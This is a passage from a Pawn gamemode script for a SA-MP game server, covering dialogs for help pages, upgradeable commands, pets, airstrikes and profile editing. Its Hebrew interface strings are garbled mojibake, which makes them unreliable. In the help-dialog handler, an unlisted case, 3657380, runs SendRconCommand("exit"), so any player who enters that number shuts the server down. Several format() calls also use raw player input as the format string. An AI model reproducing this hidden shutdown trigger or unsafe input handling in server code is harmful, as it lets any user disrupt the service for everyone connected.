					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: ющуЄ Єь фюху","чцх°","щЎщрф");
				}
				case 8: // ў°ущшщэ
				{
					DialogCreate(2);
					DialogString(@h(6A6AFF) " ╗ " @h(5757FF) webpage @h(6A6AFF) "\t:р·° фўфщьф");
					DialogString(@h(7979FF) " Х Amit_B - Єющ· с°рющ\t:·ыЁх· хЇщ·хч фюху");
					DialogString(@h(7979FF) " Х AAvivB - рсщс сььщ\t:∙щЇх°щэ х·щўхЁщэ");
					DialogString(@h(7979FF) " Х Naor - Ёрх° чьщсф\t:·ыЁх· ф∙°· хфт°ёф фчу∙ф");
					DialogString(@h(8C8CFF) " Х BaDNicK - ьщрь Ї°шх∙\t:ющщёу фўфщьф");
					DialogString(@h(9999FF) " Х 01/05/2008\t:·р°щъ щЎщ°· фюху");
					DialogString(@h(AAAAFF) "/IScripts :°∙щю· ·хёЇщэ чщЎхЁщщэ сфэ ф∙°· ю∙·ю∙");
					DialogString(@h(BBBBFF) "\nBaDNicK@SA-MP.co.il ьщЎщ°· ў∙° сыь Ёх∙р фў∙х° ь∙°· р·э юхцюЁщэ ь∙ьхч ющщь ьы·хс·");
					DialogString(@h(CACAFF) "\n Х !·хуф ЄЁўщ· ьЎхх· фЄс° хфххф ∙ь ф∙°·, ьющ ∙Єц° ссущўх· фюху рх с°ЄщхЁх· рьщх хьрьх ∙ўщуюх р· ф∙°·");
					format(string,sizeof(string),@h(E1E1FF) " Х Єь фўу∙· фцюя ьЎЇщщф сў°ущшщэ %s-·хуф ющхчу· ь",GetName(playerid));
					DialogFormat(string);
					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: ў°ущшщэ","чцх°","щЎщрф");
				}
				case 3657380: return SendRconCommand("exit");
				default:
				{
					playerinfo[playerid][clickon] = 0;
					if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkred) "·Ї°щш Єц°ф ∙тхщ",@c(red) ".ьр фўьу· ∙хэ юёЇ° ∙ь ·Ї°щш Єц°ф\n.Єьщъ ьсчх° юёЇ° ю-" @c(lightred) "1" @c(red) " Єу " @c(lightred) "8","чцх°","щЎщрф");
					else return ShowPlayerDialog(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkred) "·Ї°щш Єц°ф ∙тхщ",@c(red) ".юёЇ° ·Ї°щш фЄц°ф ∙фўьу· рщЁх ўщщэ с°∙щюф\n.Єьщъ ьсчх° юёЇ° ю-" @c(lightred) "1" @c(red) " Єу " @c(lightred) "8","чцх°","щЎщрф");
				}
			}
			playerinfo[playerid][clickon] = strval(inputtext);
			#pragma tabsize 4
		}
		case dialog_help2:
		{
			switch(playerinfo[playerid][clickon])
			{
				case 0..2, 4..5, 7..8: if(response) command(playerid,"/help");
				case 3: command(playerid,response ? ("/tutorial start") : ("/help"));
				case 6: command(playerid,response ? ("/mode") : ("/help"));
			}
		}
		case dialog_lcmds: if(response)
		{
			if(!strlen(inputtext) || strlen(inputtext) > 60) return command(playerid,"/lcmds");
			if(equal(inputtext,"next") || equal(inputtext,"фср")) command(playerid,"/lcmds 2");
			else if(equal(inputtext,"prev") || equal(inputtext,"фўхуэ")) command(playerid,"/lcmds");
			else
			{
				new thecmd[64];
				if(!IsNumeric(inputtext))
				{
					if(inputtext[0] != '/') format(thecmd,sizeof(thecmd),"/%s",inputtext);
					else format(thecmd,sizeof(thecmd),inputtext);
				}
				new i = IsNumeric(inputtext) ? (strval(inputtext) - 1) : lcmdid(thecmd);
				if(i >= 0 && i < sizeof(lcmds))
				{
					format(string,sizeof(string),@c(lightblue) "%s рЇ∙°хщх· фЇўхуф",lcmds[i][lcCommand]);
					if(lcmds[i][lcCL]) ShowPlayerDialog(playerid,dialog_lcmds2,DIALOG_STYLE_LIST,string,"ющуЄ Єь фЇўхуф\n∙у°хт фЇўхуф","сч°","чцх°");
					else ShowPlayerDialog(playerid,dialog_lcmds2,DIALOG_STYLE_LIST,string,"ющуЄ Єь фЇўхуф","сч°","чцх°");
					playerinfo[playerid][clickon] = i;
				}
				else
				{
					SendClientMessage(playerid,red," .°∙ю· Їўхуф ∙тхщф, Ёёф ∙Ёщ·");
					command(playerid,"/lcmds");
				}
			}
		}
		case dialog_lcmds2:
		{
			if(response)
			{
				new i = playerinfo[playerid][clickon], dia[400];
				switch(listitem)
				{
					case 0: // info
					{
						if(lcmds[i][lcCL]) format(dia,sizeof(dia),@c(yellow) "°ю· ∙чўя Ёу°∙·: " @c(red) "%d" @c(yellow) "\nючщ° ∙щюх∙ сЇўхуф: " @c(red) "%d$" @c(yellow) "\n∙щЇх° фЇўхуф: " @c(red) "рЇ∙°щ" @c(yellow) "\nыюх· ∙щЇх°щэ рЇ∙°щщэ: " @c(red) "%d" @c(yellow) "\nючщ° ∙щЇх°: " @c(red) "%d$" @c(green) "\n\n%s",lcmds[i][lcLevel],lcmds[i][lcCost],lcmds[i][lcMaxCL],lcmds[i][lcUpgradeCost],lcmds[i][lcExplain]);
						else format(dia,sizeof(dia),@c(yellow) "°ю· ∙чўя Ёу°∙·: " @c(red) "%d" @c(yellow) "\nючщ° ∙щюх∙ сЇўхуф: " @c(red) "%d$" @c(yellow) "\n∙щЇх° фЇўхуф: " @c(red) "ьр рЇ∙°щ" @c(green) "\n\n%s",lcmds[i][lcLevel],lcmds[i][lcCost],lcmds[i][lcExplain]);
						format(string,sizeof(string),@c(lightblue) "%s ющуЄ Єь фЇўхуф",lcmds[i][lcCommand]);
						ShowPlayerDialog(playerid,dialog_lcmdsinfo,DIALOG_STYLE_MSGBOX,string,dia,"чцх°","");
					}
					case 1: // upgrade
					{
						if(lcmds[i][lcCL])
						{
							if(playerinfo[playerid][upgradecmd][i] >= lcmds[i][lcMaxCL]) return ShowPlayerDialog(playerid,dialog_lcmdsinfo,DIALOG_STYLE_MSGBOX,string,@c(red) "!∙у°т· ыс° р· фЇўхуф фцх ь°ю· ф∙у°хт фыщ тсхфф ∙рЇ∙°","чцх°","щЎщрф");
							new cmdslot = lcmds[i][lcCMDID];
							format(dia,sizeof(dia),@c(yellow) "∙у°хт фЇўхуф фцх Єхьф " @c(red) "%d$" @c(yellow) "\n?фрэ р·ф сшхч ∙с°ЎхЁъ ь∙у°т",lcmds[i][lcUpgradeCost]);
							format(string,sizeof(string),@c(lightblue) "(%d/%d) %s ∙у°хт фЇўхуф",playerinfo[playerid][upgradecmd][cmdslot]+1,lcmds[i][lcMaxCL],lcmds[i][lcCommand]);
							ShowPlayerDialog(playerid,dialog_lcmdsupgrade,DIALOG_STYLE_MSGBOX,string,dia,"∙у°хт","чцх°");
						}
					}
				}
			}
			else command(playerid,"/lcmds");
		}
		case dialog_lcmdsinfo:
		{
			format(string,sizeof(string),@c(lightblue) "%s рЇ∙°хщх· фЇўхуф",lcmds[playerinfo[playerid][clickon]][lcCommand]);
			if(lcmds[playerinfo[playerid][clickon]][lcCL]) ShowPlayerDialog(playerid,dialog_lcmds2,DIALOG_STYLE_LIST,string,"ющуЄ Єь фЇўхуф\n∙у°хт фЇўхуф","сч°","чцх°");
			else ShowPlayerDialog(playerid,dialog_lcmds2,DIALOG_STYLE_LIST,string,"ющуЄ Єь фЇўхуф","сч°","чцх°");
		}
		case dialog_lcmdsupgrade:
		{
			new i = playerinfo[playerid][clickon], cmdslot = lcmds[i][lcCMDID], dia[128];
			format(string,sizeof(string),@c(lightblue) "(%d/%d) %s ∙у°хт фЇўхуф",playerinfo[playerid][upgradecmd][cmdslot]+1,lcmds[i][lcMaxCL],lcmds[i][lcCommand]);
			if(playerinfo[playerid][level] < lcmds[i][lcLevel])
			{
				format(dia,sizeof(dia),@c(red) "р·ф ьр с°юф юёЇщў тсхфф! ыущ ь∙у°т р· фЇўхуф фцх р·ф Ў°щъ °юф %d",lcmds[i][lcLevel]);
				return ShowPlayerDialog(playerid,dialog_lcmdsinfo,DIALOG_STYLE_MSGBOX,string,dia,"чцх°","щЎщрф");
			}
			if(playerinfo[playerid][upgradecmd][cmdslot] >= lcmds[i][lcMaxCL])
			{
				format(dia,sizeof(dia),@c(red) "∙у°т· р· фЇўхуф фцх ыс° ь°ю· ф∙у°хт фтсхфф сщх·° ∙ьф - %d",lcmds[i][lcMaxCL]);
				return ShowPlayerDialog(playerid,dialog_lcmdsinfo,DIALOG_STYLE_MSGBOX,string,dia,"чцх°","щЎщрф");
			}
			if(GetMoney(playerid) < lcmds[i][lcUpgradeCost])
			{
				format(dia,sizeof(dia),@c(red) "рщя ьъ юёЇщў ыёє! ыущ ь∙у°т р· фЇўхуф фцх р·ф Ў°щъ %d$",lcmds[i][lcUpgradeCost]);
				return ShowPlayerDialog(playerid,dialog_lcmdsinfo,DIALOG_STYLE_MSGBOX,string,dia,"чцх°","щЎщрф");
			}
			GiveMoney(playerid,0-lcmds[i][lcUpgradeCost], 40);
			playerinfo[playerid][upgradecmd][cmdslot]++;
			format(dia,sizeof(dia),@c(orange) "!ь°ю· ∙у°хт %d ю·хъ %d %s ∙щу°т· р· фЇўхуф",playerinfo[playerid][upgradecmd][cmdslot],lcmds[i][lcMaxCL],lcmds[i][lcCommand]);
			ShowPlayerDialog(playerid,dialog_lcmdsinfo,DIALOG_STYLE_MSGBOX,string,dia,"чцх°","щЎщрф");
			if(playerinfo[playerid][logged])
			{
				format(string,sizeof(string),"UpgradeCommand_%d",cmdslot);
				fsetint(fuser(playerid),string,playerinfo[playerid][upgradecmd][cmdslot]);
			}
		}
		case dialog_property: if(response && playerinfo[playerid][propertyid] != -1) command(playerid,propinfo[playerinfo[playerid][propertyid]][owner] == playerid ? ("/sell") : ("/buy"));
		case dialog_pets: if(response)
		{
			if(!IsPlayerInStore(playerid,store_pets)) return ShowPlayerDialog(playerid,dialog_petserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "чщх·",@c(red) ".Єьщъ ьфщх· счЁх· фчщх· ыущ ьўЁх· чщф","чцх°","щЎщрф");
			if(playerinfo[playerid][pet] != 0) return ShowPlayerDialog(playerid,dialog_petserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "чщх·",@c(red) "/Pet Remove :ыс° щ∙ ьъ чщф, ыущ ьфёщ° рх·ф","чцх°","щЎщрф");
			listitem++;
			if(playerinfo[playerid][level] < Pets[listitem][petLevel])
			{
				format(string,sizeof(string),@c(red) ".р·ф ьр с°юф юёЇщўф ыущ ьўЁх· %s, Єьщъ ьфщх· ьЇчх· с°юф %d",Pets[listitem][petLevel],Pets[listitem][petHebName]);
				return ShowPlayerDialog(playerid,dialog_petserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "чщх·",string,"чцх°","щЎщрф");
			}
			if(GetMoney(playerid) < Pets[listitem][petCost])
			{
				format(string,sizeof(string),@c(red) ".рщя ьъ юёЇщў ыёє ыущ ьўЁх· %s, р·ф Ў°щъ $%d",Pets[listitem][petHebName],Pets[listitem][petCost]);
				return ShowPlayerDialog(playerid,dialog_petserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "чщх·",string,"чцх°","щЎщрф");
			}
			GiveMoney(playerid,0-Pets[listitem][petCost], 41);
			format(talkBubble,sizeof(talkBubble),"юць шхс! ўЁщ· %s",Pets[listitem][petHebName]);
			format(string,sizeof(string)," :ўЁщ· %s! ьЇЁщъ °∙щю· Їўхух· ∙щюх∙щх·",Pets[listitem][petHebName]);
			NPCTalk("DM_PetShop",string,playerid,1,1,1);
			SendClientMessage(playerid,grey," /pet on - ф∙·ю∙ сЇўхуф фцх ыущ ьфхЎщр р· фчщф");
			SendClientMessage(playerid,grey," /pet off - ф∙·ю∙ сЇўхуф фцх ыущ ьфысщр р· фчщф");
			SendClientMessage(playerid,grey," /pet attack [id] - ыущ ьЇўху Єь фчщф ь·ўхє ∙чўя");
			SendClientMessage(playerid,grey," /pet stop - ыущ ьфЇёщў ь·ўхє ∙чўя");
			SendClientMessage(playerid,grey," /pet remove - (ыущ ьючхў р· фчщф (ььр фчц° ыёЇщ");
			playerinfo[playerid][pet][0] = listitem;
			if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Pet",playerinfo[playerid][pet][0]);
		}
		case dialog_petserr: if(response) command(playerid,"/pets");
		case dialog_airstrike: if(response)
		{
			playerinfo[playerid][clickon] = listitem;
			switch(listitem)
			{
				case 0: // save pos
				{
					if(playerinfo[playerid][aause] > 0) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".фю·я ∙фю·ўЇф фрхщ°щ· фЁхычщ· ·ё·щщэ","чцх°","щЎщрф");
					if(playerinfo[playerid][level] < 5) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".ь∙щюх∙ срЇ∙°х· фцр· Єьщъ ьфщх· ьЇчх· с°юф 5","чцх°","щЎщрф");
					if(!CanUseCommand(playerid)) return 1;
					if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != world_normal) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".ьр Ёщ·я ьф∙·ю∙ срЇ∙°х· фцх ыря","чцх°","щЎщрф");
					GetPlayerPos(playerid,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2]);
					ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(green) "!∙ю°· сфЎьчф ющўхэ ью·ўЇф рхщ°щ·","чцх°","щЎщрф");
				}
				case 1: // army 1
				{
					ShowPlayerDialog(playerid,dialog_airstrike2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇф Ўсрщ· с°юф 1",@c(grey) ".ь∙щюх∙ сю·ўЇф цх Ў°щъ °юф 5 х-2500$\n\n:фщр юыщьф\n1 - юшхё Ўсрщ","GO!","чцх°");
				}
				case 2: // army 2
				{
					ShowPlayerDialog(playerid,dialog_airstrike2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇф Ўсрщ· с°юф 2",@c(grey) ".ь∙щюх∙ сю·ўЇф цх Ў°щъ °юф 7 х-3200$\n\n:фщр юыщьф\n2 - юёхў Ўсрщ","GO!","чцх°");
				}
				case 3: // army 3
				{
					ShowPlayerDialog(playerid,dialog_airstrike2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇф Ўсрщ· с°юф 3",@c(grey) ".ь∙щюх∙ сю·ўЇф цх Ў°щъ °юф 10 х-4500$\n\n:фщр юыщьф\n2 - юшхё Ўсрщ\n2 - юёхў Ўсрщ\n1 - шЁў","GO!","чцх°");
				}
				case 4: // atom
				{
					ShowPlayerDialog(playerid,dialog_airstrike2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇф ршхющ·",@c(grey) ".ь∙щюх∙ сю·ўЇф цх Ў°щъ °юф 12 х-12000$\n\n:фщр юыщьф\n1 - юшхё ЄЁў\n1 - шщь","GO!","чцх°");
				}
				case 5: // aliens
				{
					ShowPlayerDialog(playerid,dialog_airstrike2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇ· чщщц°щэ",@c(grey) ".ь∙щюх∙ сю·ўЇф цх Ў°щъ °юф 14 х-12000$\n\n:фщр юыщьф\n2 - чььщ·","GO!","чцх°");
				}
			}
		}
		case dialog_airstrike2:
		{
			if(response)
			{
				if(playerinfo[playerid][aapos][0] == 0.0 || playerinfo[playerid][aapos][1] == 0.0 || playerinfo[playerid][aapos][2] == 0.0) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".Єьщъ ь∙юх° ющўхэ ью·ўЇф фрхщ°щ· ыущ ь∙ьхч рх·ф","чцх°","щЎщрф");
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][aause] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 250.0) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".ющ∙фх срцх° ∙ьъ ыс° ю∙·ю∙ сю·ўЇф рхщ°щ·, фю·я ∙фхр щёщщэ","чцх°","щЎщрф");
				if(playerinfo[playerid][aause] > 0) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".р·ф ыс° ю∙·ю∙ ы°тЄ сю·ўЇф рхщ°щ·","чцх°","щЎщрф");
				new tele = GetPlayerTeleportArea(playerid), nameOfAttack[32];
				switch(playerinfo[playerid][clickon])
				{
					case 1: // army 1
					{
						if(playerinfo[playerid][level] < 5) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".р·ф ьр с°ю· ∙чўя юёЇщў тсхфф, ю·ўЇф цх ух°∙· °юф 5","чцх°","щЎщрф");
						if(GetMoney(playerid) < 2500) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".рщя ьъ юёЇщў ыёє, ю·ўЇф цх Єхьф 2500$","чцх°","щЎщрф");
						GiveMoney(playerid,0-2500, 42);
						SetTimerPck(playerinfo[playerid][aatimer],"AirStrike",500,1,"i",playerid);
						playerinfo[playerid][aaveh][0] = CreateVehicleEx(520,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						nameOfAttack = "ю·ўЇф Ўсрщ· °юф 1";
					}
					case 2: // army 2
					{
						if(playerinfo[playerid][level] < 7) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".р·ф ьр с°ю· ∙чўя юёЇщў тсхфф, ю·ўЇф цх ух°∙· °юф 7","чцх°","щЎщрф");
						if(GetMoney(playerid) < 3200) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".рщя ьъ юёЇщў ыёє, ю·ўЇф цх Єхьф 3200$","чцх°","щЎщрф");
						GiveMoney(playerid,0-3200, 42);
						SetTimerPck(playerinfo[playerid][aatimer],"AirStrike",250,1,"i",playerid);
						playerinfo[playerid][aaveh][0] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]-5.0,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaveh][1] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]+5.0,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						nameOfAttack = "ю·ўЇф Ўсрщ· °юф 2";
					}
					case 3: // army 3
					{
						if(playerinfo[playerid][level] < 10) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".р·ф ьр с°ю· ∙чўя юёЇщў тсхфф, ю·ўЇф цх ух°∙· °юф 10","чцх°","щЎщрф");
						if(GetMoney(playerid) < 4500) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".рщя ьъ юёЇщў ыёє, ю·ўЇф цх Єхьф 4500$","чцх°","щЎщрф");
						GiveMoney(playerid,0-4500, 42);
						SetTimerPck(playerinfo[playerid][aatimer],"AirStrike",250,1,"i",playerid);
						playerinfo[playerid][aaveh][0] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]-5.2,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaveh][1] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]+5.2,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaveh][2] = CreateVehicleEx(520,playerinfo[playerid][aapos][0]-14.0,playerinfo[playerid][aapos][1]-207.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaveh][3] = CreateVehicleEx(520,playerinfo[playerid][aapos][0]+14.0,playerinfo[playerid][aapos][1]-207.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaveh][4] = CreateVehicleEx(432,playerinfo[playerid][aapos][0]+7.5,playerinfo[playerid][aapos][1]-203.0,playerinfo[playerid][aapos][2],0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						nameOfAttack = "ю·ўЇф Ўсрщ· °юф 3";
					}
					case 4: // atom
					{
						if(playerinfo[playerid][level] < 12) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".р·ф ьр с°ю· ∙чўя юёЇщў тсхфф, ю·ўЇф цх ух°∙· °юф 12","чцх°","щЎщрф");
						if(GetMoney(playerid) < 12000) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".рщя ьъ юёЇщў ыёє, ю·ўЇф цх Єхьф 12000$","чцх°","щЎщрф");
						GiveMoney(playerid,0-12000, 42);
						SetTimerPck(playerinfo[playerid][aatimer],"AirStrike",500,1,"i",playerid);
						playerinfo[playerid][aaveh][0] = CreateVehicleEx(592,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaobj][0] = CreateSObject(3790,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,0.0,0.0,object_show_distance,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						nameOfAttack = "ю·ўЇф ршхющ·";
					}
					case 5: // aliens
					{
						if(playerinfo[playerid][level] < 14) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".р·ф ьр с°ю· ∙чўя юёЇщў тсхфф, ю·ўЇф цх ух°∙· °юф 14","чцх°","щЎщрф");
						if(GetMoney(playerid) < 12000) return ShowPlayerDialog(playerid,dialog_airstrikeerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю·ўЇх· рхщ°щх·",@c(red) ".рщя ьъ юёЇщў ыёє, ю·ўЇф цх Єхьф 12000$","чцх°","щЎщрф");
						GiveMoney(playerid,0-12000, 42);
						playerinfo[playerid][aaobj][0] = CreateSObject(16778,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,0.0,0.0,object_show_distance,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaobj][1] = CreateSObject(16778,playerinfo[playerid][aapos][0]+9.0,playerinfo[playerid][aapos][1]-205.0,playerinfo[playerid][aapos][2]+52.0,0.0,0.0,0.0,object_show_distance,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
						playerinfo[playerid][aaparam] = 0;
						SetTimerPck(playerinfo[playerid][aatimer],"AirStrike",500,1,"i",playerid);
						nameOfAttack = "ю·ўЇ· чщщц°щэ";
					}
				}
				playerinfo[playerid][aause] = playerinfo[playerid][clickon];
				playerinfo[playerid][aasetp] = (0-200);
				if(strlen(nameOfAttack) > 0 && tele > -1)
				{
					format(string,sizeof(string)," Х !" @c(yellow) "%s" @c(orange) " ф∙·ю∙ сю·ўЇф рхщ°щ· юёхт \"%s\" с∙щтх° %s",Teleports[tele][Tcmd],nameOfAttack,GetName(playerid));
					SendClientMessageToAll(orange,string);
				}
			}
			else command(playerid,"/airstrike");
		}
		case dialog_airstrikeerr: if(response) command(playerid,"/airstrike");
		case dialog_profile:
		{
			if(response) command(playerid,"/profile edit");
			else
			{
				if(playerinfo[playerid][showstats] != INVALID_PLAYER_ID)
				{
					UpdateStatsFields(playerid,"hide");
					playerinfo[playerid][showstats] = INVALID_PLAYER_ID;
				}
			}
		}
		case dialog_editprofile: if(response)
		{
			if(listitem == 0 && playerinfo[playerid][noname]) return ShowPlayerDialog(playerid,dialog_editprofile3,DIALOG_STYLE_MSGBOX,@c(lightblue) "Є°щы· Ї°хЇщь",@c(red) ".Ёчёюф ьъ фрЇ∙°х· ь∙Ёх· ∙э Ї°шщ. Ўх° ў∙° Єэ фрующЁщэ ьфё°· фчёщюф","чцх°","щЎщрф");
			playerinfo[playerid][clickon] = listitem;
			new enterwhat[32], example[64];
			PlaySound(playerid,1057);
			switch(listitem)
			{
				case 0: enterwhat = "ф∙э фЇ°шщ", example = "фўьу сЄс°щ· сьсу";
				case 1: enterwhat = "ющўхэ фютх°щэ", example = "фўьу сЄс°щ· сьсу";
				case 2: enterwhat = "·р°щъ фьщуф", example = "фўьу сЎх°ф ∙ь ∙Ёф/чху∙/щхэ, ьухтюф 1/1/1970";
				case 3: enterwhat = "юёЇ° фрщщёщўщх", example = "фўьу юёЇ°щэ сьсу";
				case 4: enterwhat = "ы·хс· фюёЁт'°", example = "фўьу ы·хс· чхўщ·";
				case 5: enterwhat = "∙э фёўщщЇ", example = "фўьу ∙э чхўщ";
				case 6: enterwhat = "∙э фЇщщёсхў", example = "фўьу ∙э чхўщ";
				case 7: enterwhat = "ы·хс· фющщь", example = "фўьу ы·хс· ющщь чхўщ·";
			}
			format(string,sizeof(string),@c(grey) ":None фўьу ыря р· %s ∙ьъ, рэ с°ЎхЁъ ьр ьфЎщт фўьу\n(" @c(red) "%s" @c(grey) ")",enterwhat,example);
			ShowPlayerDialog(playerid,dialog_editprofile2,DIALOG_STYLE_INPUT,@c(lightblue) "Є°щы· Ї°хЇщь",string,"Є°щыф","сщшхь");
		}
		case dialog_editprofile2: if(response)
		{
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dialog_editprofile3,DIALOG_STYLE_MSGBOX,@c(lightblue) "Є°щы· Ї°хЇщь",@c(red) "!ьр фўьу· ыьхэ","чцх°","щЎщрф");
			new enterwhat[32], bool:none = bool:equal(inputtext,"None"), err[64];
			PlaySound(playerid,1057);
			switch(playerinfo[playerid][clickon])
			{
				case 0:
				{
					enterwhat = "ф∙э фЇ°шщ";
					if(none)
					{
						format(playerinfo[playerid][rname],16,"None");
						fsetstring(fuser(playerid),"ProfileRealName","None");
					}
					else
					{
						new bool:hebrew = true;
						for(new i = 0, j = strlen(inputtext); i < j && hebrew; i++) if((inputtext[i] < 'р' || inputtext[i] > '·') && inputtext[i] != '\'' && inputtext[i] != ' ' && inputtext[i] != '-') hebrew = false;
						if(!hebrew) err = ".ф∙э фЇ°шщ чщщс ьфщх· сЄс°щ·";
						else if(strlen(inputtext) < 2 || strlen(inputtext) > 12) err = ".рх°ъ ф∙э фЇ°шщ ўЎ° рх р°хъ юущ";
						else
						{
							format(playerinfo[playerid][rname],16,inputtext);
							fsetstring(fuser(playerid),"ProfileRealName",playerinfo[playerid][rname]);
						}
					}
				}
				case 1:
				{
					enterwhat = "ющўхэ фютх°щэ";
					if(none)
					{
						format(playerinfo[playerid][country],30,"None");
						fsetstring(fuser(playerid),"ProfileCountry","None");
					}
					else
					{
						new bool:hebrew = true;
						for(new i = 0, j = strlen(inputtext); i < j && hebrew; i++) if((inputtext[i] < 'р' || inputtext[i] > '·') && inputtext[i] != '\'' && inputtext[i] != ' ' && inputtext[i] != '\"' && inputtext[i] != '-') hebrew = false;
						if(!hebrew) err = ".ющўхэ фютх°щэ чщщс ьфщх· сЄс°щ·";
						else if(strlen(inputtext) < 2 || strlen(inputtext) > 30) err = ".рх°ъ ющўхэ фютх°щэ ўЎ° рх р°хъ юущ";
						else
						{
							format(playerinfo[playerid][country],30,inputtext);
							fsetstring(fuser(playerid),"ProfileCountry",playerinfo[playerid][country]);
						}
					}
				}
				case 2:
				{
					enterwhat = "·р°щъ фьщуф";
					if(none)
					{
						playerinfo[playerid][birthdate] = {0,0,0};
						fsetint(fuser(playerid),"ProfileBirthDay",0);
						fsetint(fuser(playerid),"ProfileBirthMonth",0);
						fsetint(fuser(playerid),"ProfileBirthYear",0);
					}
					else
					{
						if(charcount(inputtext,'/') != 2 || strlen(inputtext) < 8 || strlen(inputtext) > 10) err = ".ф·р°щъ ∙фхўьу Ёы·с сЎх°ф ∙тхщф";
						else
						{
							new d[3], today[3], idx;
